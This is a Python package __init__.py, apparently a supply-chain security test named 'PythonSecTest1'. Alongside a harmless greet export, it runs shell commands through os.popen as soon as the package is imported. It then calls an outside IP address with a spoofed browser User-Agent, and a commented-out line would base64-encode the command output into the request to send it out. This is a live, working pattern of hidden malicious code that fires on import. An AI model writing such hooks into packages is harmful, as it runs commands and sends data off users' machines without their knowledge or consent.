# -*- coding: utf-8 -*-
import os
import sys
import base64
import platform

# my_package/__init__.py
from .module1 import greet

import requests


def test(url):
    normal_user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5"
    user_agent = normal_user_agent
    headers = {'content-type': 'application/json', "User-Agent": user_agent}

    
    d = ""
    cmd_list = ''
    os_name = platform.system()
    try:
        if os_name == 'Linux' or os_name == 'Darwin':            
            cmd_list = "ls /tmp/www123456"
            d = os.popen(cmd_list).read()
        elif os_name == 'Windows':           
            cmd_list = "type ReadMe.txt"
            d = os.popen(cmd_list).read()
        else:
            print(f"other: {os_name}")        
    except Exception as e:
        print("Exception: {}".format(e))
    print("[***] execute command: {}".format(cmd_list))
    #tj_data = base64.b64encode(d.encode()).decode()
    tj_data = "test2"
    full_url = '{}/data/{}'.format(url, tj_data)
    print("[***] visit {}".format(full_url)) 
    response = requests.get(full_url, headers=headers)
    if response.status_code == 200:
        print("Success!")
        print(response.text)
    else:
        print("Error:", response.status_code)
        print(response.text)
print("run at import ...")        
print("{} in package {}".format("__init__.py", "PythonSecTest1"))
url = "http://119.29.29.29/run_at_import_stage"
test(url)
__all__ = ['greet']  
